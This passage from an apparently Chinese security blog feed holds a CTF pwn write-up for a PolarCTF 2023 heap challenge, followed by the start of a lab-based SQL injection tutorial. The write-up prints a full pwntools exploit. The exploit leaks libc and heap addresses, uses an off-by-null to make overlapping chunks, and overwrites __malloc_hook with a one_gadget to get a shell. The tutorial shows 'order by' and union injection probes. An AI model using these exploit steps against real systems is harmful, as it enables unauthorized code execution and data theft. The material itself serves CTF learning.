ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> is_local:</span><br><span class="line">		p = process(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(<span class="string">&#x27;IP&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(p, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size, data, mark</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the size of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the name of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give the chicken a mark. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(mark)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you kill? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Cook</span>(<span class="params">idx, name, cook</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you cook? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me new name.\n&quot;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me Cook name.\n&quot;</span>)</span><br><span class="line">	p.send(cook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Black</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>定义了函数接口和前置操作。</p>
<h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">	<span class="keyword">global</span> __malloc_hook, libc_base</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">	Delete(<span class="number">0</span>)</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">	Black()</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	libc_base = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">	log.success(<span class="string">&quot;libc : 0x%x&quot;</span> % libc_base)</span><br><span class="line">	__malloc_hook = libc_base + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br></pre></td></tr></table></figure></div>

<p>本题泄露利用<code>unsorted bin</code>中保存的<code>libc</code>地址与<code>libc</code>基址的固定偏移获取<code>libc</code>基址。因为结构体在初始化时并未初始化<code>ErrMsg</code>的值，并且其大小为<code>0x90</code>，我们申请一个结构体再将其释放，再次申请时可将其从<code>unsorted bin</code>中申请出来，然后可以通过打印函数打印<code>unsorted bin</code>中的内容。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911185916169.png"
                      alt="image-20230911185916169"
                ></p>
<p>在打印前下断点可以看到，此时<code>ErrMsg</code>中保存的值为<code>libc</code>地址。由于<code>libc</code>中的地址固定偏移不受<code>pie</code>和<code>aslr</code>保护影响，可以由此计算出<code>libc</code>基址。</p>
<h3 id="泄露heap地址"><a href="#泄露heap地址" class="headerlink" title="泄露heap地址"></a>泄露heap地址</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_heap</span>():</span><br><span class="line">	<span class="keyword">global</span> heap_addr</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">3</span>)</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Cook(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;cccccccn&#x27;</span>);</span><br><span class="line">	Black()</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;1\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;cccccccn&#x27;</span>)</span><br><span class="line">	heap_addr = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	log.success(<span class="string">&quot;heap : 0x%x&quot;</span> % heap_addr)</span><br></pre></td></tr></table></figure></div>

<p>堆地址也可以通过<code>unsorted bin</code>的<code>bk</code>指针泄露，我们将两个不连续的<code>non-fast</code>大小的堆块放入<code>unsorted bin</code>中，由于<code>unsorted bin</code>采取先进先出模式，所以我们会将<code>结构体1</code>重新申请出来，它<code>ErrMsg</code>的<code>bk</code>位置便是<code>结构体3</code>的地址。然后通过改名函数将<code>ErrMsg</code>的前八个字节覆盖满，然后便可通过打印函数将堆地址泄露。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911191326440.png"
                      alt="image-20230911191326440"
                ></p>
<p>同样在打印前下一个断点，可以看到其<code>bk</code>位置为一个堆地址。</p>
<h3 id="通过修改-malloc-hook为one-gadget地址get-shell"><a href="#通过修改-malloc-hook为one-gadget地址get-shell" class="headerlink" title="通过修改__malloc_hook为one_gadget地址get_shell"></a>通过修改__malloc_hook为one_gadget地址get_shell</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">	Add(<span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x320</span>) + p64(heap_addr+<span class="number">0x190</span>) + p64(heap_addr+<span class="number">0x190</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 4</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 5</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 7</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	Add(<span class="number">0x68</span>, <span class="string">b&#x27;k&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x320</span>), <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	Add(<span class="number">0x2D0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2A0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook-<span class="number">0x23</span>) + p64(<span class="number">0xdeadbeef</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Delete(<span class="number">0</span>)</span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">2</span>)</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">	one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+one[<span class="number">1</span>]), <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></div>

<p>因为<code>Add</code>函数存在<code>off-by-null</code>漏洞，所以我们可以制造一个堆块重叠，将一个<code>fast chunk</code>包含在其中，这里需要注意的时，我们要绕过<code>unlink</code>检查，需要将伪造的<code>fake chunk</code>的<code>fd</code>和<code>bk</code>指向它本身。然后计算好偏移将<code>fast chunk</code>的<code>fd</code>位置改为<code>__malloc_hook</code>附近包含<code>__malloc_hook</code>大小的<code>fake chunk</code>的位置。然后将<code>__malloc_hook</code>改为<code>one_gadget</code>。此时四个<code>one_gadget</code>都无法打通，我们可以<code>free</code>一个错误的<code>chunk</code>来调用<code>malloc_printerr</code>函数，这个函数中存在其他的调用，最后会调用到<code>malloc</code>，然后便可调用<code>one_gadget</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911193221372.png"
                      alt="image-20230911193221372"
                ></p>
<p>通过<code>find_fake_fast</code>来寻找<code>__malloc_hook</code>附近的<code>fake_chunk</code>。<code>fake_chunk</code>的<code>prev_size</code>距离<code>__malloc_hook</code>有0x23大小。所以填充<code>0x13</code>字节即可覆盖到目标地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911193629573.png"
                      alt="image-20230911193629573"
                ></p>
<p>我们可以通过<code>k</code>来查看函数调用栈，发现<code>free</code>报错后会在动态链接器调用<code>malloc</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911194307830.png"
                      alt="image-20230911194307830"
                ></p>
<p>可以在源码中发现，由于<code>free</code>一个错误堆块调用了<code>malloc_printerr</code>函数，最后在<code>dl-error.c</code>调用了<code>malloc</code>函数。</p>
<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">is_debug = <span class="literal">False</span></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">	<span class="keyword">global</span> elf, libc, p</span><br><span class="line">	elf = ELF(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> is_local:</span><br><span class="line">		p = process(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(<span class="string">&#x27;IP&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(p, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size, data, mark</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the size of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the name of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give the chicken a mark. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(mark)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you kill? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Cook</span>(<span class="params">idx, name, cook</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you cook? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me new name.\n&quot;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me Cook name.\n&quot;</span>)</span><br><span class="line">	p.send(cook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Black</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">	<span class="keyword">global</span> __malloc_hook, libc_base</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">20</span>) <span class="comment"># 0 errmsg_0x90-&gt;unsorted</span></span><br><span class="line">	Delete(<span class="number">0</span>) <span class="comment"># errmsg_0x90-&gt;unsorted</span></span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">20</span>) <span class="comment"># 0 # unsorted-&gt;errmsg_0x90</span></span><br><span class="line">	Black()</span><br><span class="line">	<span class="comment">#debug() # db1</span></span><br><span class="line">	p.recvuntil(<span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	libc_base = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">	log.success(<span class="string">&quot;libc : 0x%x&quot;</span> % libc_base)</span><br><span class="line">	__malloc_hook = libc_base + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">	sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_heap</span>():</span><br><span class="line">	<span class="keyword">global</span> heap_addr</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">3</span>)</span><br><span class="line">	<span class="comment">#debug() # db2</span></span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Cook(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;cccccccn&#x27;</span>)</span><br><span class="line">	Black()</span><br><span class="line">	<span class="comment">#debug() # db3</span></span><br><span class="line">	p.recvuntil(<span class="string">b&quot;1\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;cccccccn&#x27;</span>)</span><br><span class="line">	heap_addr = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	log.success(<span class="string">&quot;heap : 0x%x&quot;</span> % heap_addr)</span><br><span class="line">	sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">	Add(<span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x320</span>) + p64(heap_addr+<span class="number">0x190</span>) + p64(heap_addr+<span class="number">0x190</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 4 first 0x71</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 5</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 7</span></span><br><span class="line">	<span class="comment">#debug() # db4</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	<span class="comment">#debug() # db5</span></span><br><span class="line">	Add(<span class="number">0x68</span>, <span class="string">b&#x27;k&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x320</span>), <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6 off-by-null</span></span><br><span class="line">	<span class="comment">#debug() # db6</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	<span class="comment">#debug() # db7</span></span><br><span class="line">	Add(<span class="number">0x2D0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2A0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook-<span class="number">0x23</span>) + p64(<span class="number">0xdeadbeef</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	<span class="comment">#debug() # db8</span></span><br><span class="line">	Delete(<span class="number">0</span>)</span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">2</span>)</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">	one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+one[<span class="number">1</span>]), <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#gdb.attach(p, &#x27;b *_dl_signal_error&#x27;)</span></span><br><span class="line">	Delete(<span class="number">4</span>)</span><br><span class="line">	<span class="comment">#pause()</span></span><br><span class="line">	sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">	connect()</span><br><span class="line">	get_libc()</span><br><span class="line">	get_heap()</span><br><span class="line">	get_shell()</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn题解</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全-SQL_injection</title>
    <url>/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要学一下IOT安全，但我web方面还是个小白，所以有了二进制选手的web安全之路这个系列。我打算把每天学的web安全以及渗透相关的知识积累起来，每篇文章作为一个专题，后续如果发现了这个专题的其他内容，也会补充这些新内容。本着开源精神，利己利他，后续有和我一样的同学也能少走些弯路。</p>
<h1 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h1><p>靶场环境 ：<strong>ctfhub技能数-&gt;web-&gt;sql注入</strong><br>注入参数为整数类型，语句类似 <strong>select * from news where id&#x3D;参数</strong>。</p>
<h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><h3 id="手动解法"><a href="#手动解法" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>可以根据回显结果来判断我们插入的语句是否被解析为 sql 语法，是否存在整数注入。</li>
</ol>
<ul>
<li>有回显<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916260_65065ea4ef5f74197d22d.jpeg"
                      alt="图片.png"
                ></li>
<li>无回显<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916280_65065eb84cc85d0f84691.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="2">
<li>确认查询列数。输入到 3 时返回错误，所以列数为 2 。</li>
</ol>
<ul>
<li>输入<code>1 order by 1</code>有回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916304_65065ed0c6d83b7476271.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 order by 2</code>有回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916380_65065f1ce90b56a129953.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 order by 3</code>无回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916437_65065f554ccda7aa2c70c.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="3">
<li>通过<code>union</code>注入查询数据。<a class="link"   href="https://blog.csdn.net/qq_33704186/article/details/81909276#:~:text=1%20UNION%E5%BF%85%E9%A1%BB%E7%94%B1%E4%B8%A4%E6%9D%A1%E4%BB%A5%E4%B8%8A%E7%9A%84SELECT%E8%AF%AD%E5%8F%A5%E7%BB%84%E6%88%90%EF%BC%8C%E8%AF%AD%E5%8F%A5%E4%B9%8B%E9%97%B4%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97UNION%E5%88%86%E5%89%B2%E3%80%82%202%20UNION%E4%B8%AD%E7%9A%84%E6%AF%8F%E4%B8%AA%E6%9F%A5%E8%AF%A2%E5%BF%85%E9%A1%BB%E5%8C%85%E5%90%AB%E7%9B%B8%E5%90%8C%E7%9A%84%E5%88%97%E3%80%81%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%88%96%E8%81%9A%E9%9B%86%E5%87%BD%E6%95%B0%EF%BC%88%E5%90%84%E4%B8%AA%E5%88%97%E4%B8%8D%E9%9C%80%E8%A6%81%E4%BB%A5%E7%9B%B8%E5%90%8C%E7%9A%84%E6%AC%A1%E5%BA%8F%E5%88%97%E5%87%BA%EF%BC%89%E3%80%82,3%20%E5%88%97%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%BF%85%E9%A1%BB%E5%85%BC%E5%AE%B9%EF%BC%9A%E7%B1%BB%E5%9E%8B%E4%B8%8D%E5%BF%85%E5%AE%8C%E5%85%A8%E7%9B%B8%E5%90%8C%EF%BC%8C%E4%BD%86%E5%BF%85%E9%A1%BB%E6%98%AFDBMS%E5%8F%AF%E4%BB%A5%E9%9A%90%E5%90%AB%E5%9C%B0%E8%BD%AC%E6%8D%A2%E7%9A%84%E7%B1%BB%E5%9E%8B%E3%80%82%204%20%E5%A6%82%E6%9E%9C%E5%8F%96%E5%87%BA%E6%9D%A5%E7%9A%84%E6%95%B0%E6%8D%AE%E4%B8%8D%E9%9C%80%E8%A6%81%E5%8